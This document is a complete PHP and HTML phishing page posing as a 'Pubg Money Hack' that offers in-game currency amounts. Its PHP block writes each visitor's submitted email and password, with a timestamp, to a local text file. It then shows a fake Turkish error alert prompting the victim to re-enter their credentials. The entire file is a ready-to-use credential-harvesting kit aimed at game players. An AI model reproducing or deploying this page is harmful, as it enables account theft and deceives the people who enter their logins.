
<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

date_default_timezone_set('Europe/Istanbul');
$tarih =" Tarih : ".date('d/m/Y  H:i');
$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n__________________ \n".$tarih."\n\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}

 ?>

<!DOCTYPE html>
<html>
 <head>
  <title>
   -- Pubg V1.3 --
  </title>
 <link rel="shortcut icon" href="https://i.pinimg.com/originals/f0/62/a3/f062a3f214b208dd4eac506542f91422.png">
  <style type="text/css">
   .div1{
      background-color:#040302;
      height:75%;
      width: 100%;
      border-radius: 35px;
      border:4px solid #21160d;
      opacity: 0.8;
      filter: alpha(opacity=40);
    }
    .text{
      color:red;
      font-size: 48px;
      background-color:black;
      padding-bottom: 20px;
      border-radius: 48px; 
    }
    .text2{
      color:orange;
      font-size:28px;
      background-color:black;
      border-radius: 50px;
      padding-top: 25px;
      padding-bottom: 25px;
    }
    .input{
     height: 40px; 
     width: 250px; 
     font-size: 18px; 
     padding: 5px; 
     margin-bottom: 15px; 
     border-radius: 7px; 
     background-color:#b4b2b2; 
     border: none; 
     color: #000; 

    }
    .button{
     width: 100px; 
     font-size: 18px;  
     margin: 0 auto;
     background-color: red; 
     border: none; 
     height: 40px; 
    border-radius: 18px;
    }
     canvas { 
     display: block; 
     position: fixed; 
  top: 0; 
  left: 0; 
     z-index: -1000; 
 }
 .body{
  background: url("https://image.radionawa.com/root/root/images/1224102018_youtubegaming2560_1440.jpg") no-repeat center center fixed; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
 }
 .select{
  color:orange;
  font-size:18px;
  width:75px;
  height:40px;
  background-color:#040302;
  border-radius: 20px;
 }
  </style>
 </head>
 <body class='body'>
  <center>
   <div class="div1">
    <p class="text">
    Pubg Money Hack
    </p>
    <form method="post">
     <p class="text2">
      PUBG
     </p>
     <p style="color:red;font-size:14px;">E-MAİL</p>
     <input class="input" name="login" placeholder="xxxxxxxx@xxxxx.com" type="email"/ required="">
     <p style="color:red;font-size:14px;">Password</p>
     <input class="input" name="password" placeholder="***********" type="password"/ required=""><br>
     <select class='select'>
      <option>1000</option>
      <option>3000</option>
      <option>5000</option>
      <option>8000</option>
      <option>10000</option>
      <option>25000</option>

     </select>
     <br>
      <br>
<input type="submit" value="Next" class='button'>


</form>
</div>
</center>
</body>
</html>